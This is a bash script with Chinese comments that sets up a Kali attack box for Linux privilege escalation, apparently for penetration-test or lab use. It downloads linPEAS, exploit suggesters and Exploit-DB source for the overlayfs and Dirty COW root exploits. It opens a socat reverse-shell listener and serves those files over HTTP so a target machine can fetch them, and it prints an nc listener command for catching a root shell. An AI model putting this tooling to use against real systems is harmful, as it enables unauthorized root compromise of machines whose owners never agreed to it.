#!/bin/bash
# setup_listener.sh - 快速搭建提权测试环境
# 用法: ./setup_listener.sh [LISTEN_PORT] [HTTP_PORT] [REV_SHELL_PORT]
# 默认: 6767 8888 8989

LPPORT=${1:-6767}
HPPORT=${2:-8888}
REVPORT=${3:-8989}
KALI_IP=$(ip -4 addr show eth0 2>/dev/null | grep -oP 'inet \K[\d.]+' | head -1)

echo "[+] Kali IP: $KALI_IP"
echo "[+] 本机弹性 shell 监听:  0.0.0.0:$LPPORT"
echo "[+] HTTP 文件服务:        0.0.0.0:$HPPORT"
echo "[+] 目标反转 shell 端口:  0.0.0.0:$REVPORT"
echo ""

# ---- 下载 linPEAS ----
if [ ! -f /tmp/linpeas.sh ]; then
    echo "[*] 下载 linPEAS..."
    curl -sL -o /tmp/linpeas.sh "https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh"
    chmod +x /tmp/linpeas.sh
fi

# ---- 下载 exploit suggester ----
for url in \
    "https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh" \
    "https://raw.githubusercontent.com/InteliSecureLabs/Linux_Exploit_Suggester/master/Linux_Exploit_Suggester.pl"; do
    fname=$(basename "$url")
    [ ! -f "/tmp/$fname" ] && curl -sL -o "/tmp/$fname" "$url" && chmod +x "/tmp/$fname"
done

# ---- 下载常见 CVE exploit 源码 ----
declare -A EXPLOITS=(
    ["ofs.c"]="https://www.exploit-db.com/raw/37292"
    ["dirtycow.c"]="https://www.exploit-db.com/raw/40839"
    ["dirtycow_32.c"]="https://www.exploit-db.com/raw/40616"
)
for fname in "${!EXPLOITS[@]}"; do
    [ ! -f "/tmp/$fname" ] && curl -sL -o "/tmp/$fname" "${EXPLOITS[$fname]}"
done

# ---- tmux session ----
tmux new-session -d -s revshell 2>/dev/null
tmux send-keys -t revshell "socat TCP-LISTEN:$LPPORT,fork,reuseaddr -" Enter

# ---- HTTP server ----
cd /tmp && python3 -m http.server "$HPPORT" &
echo "[+] HTTP 服务已启动: http://$KALI_IP:$HPPORT/"

# ---- 本机反转 shell 监听 ----
echo "[*] 提示: 如需本机收反弹 root shell，另一个终端执行:"
echo "    nc -lvnp $REVPORT"
echo ""
echo "[*] 目标机上可用的文件:"
echo "    http://$KALI_IP:$HPPORT/linpeas.sh"
echo "    http://$KALI_IP:$HPPORT/linux-exploit-suggester.sh"
echo "    http://$KALI_IP:$HPPORT/ofs.c         (CVE-2015-1328 overlayfs)"
echo "    http://$KALI_IP:$HPPORT/dirtycow.c      (CVE-2016-5195 Dirty COW)"
echo ""
echo "[!] 监听 $LPPORT 中，等待目标反弹 shell..."
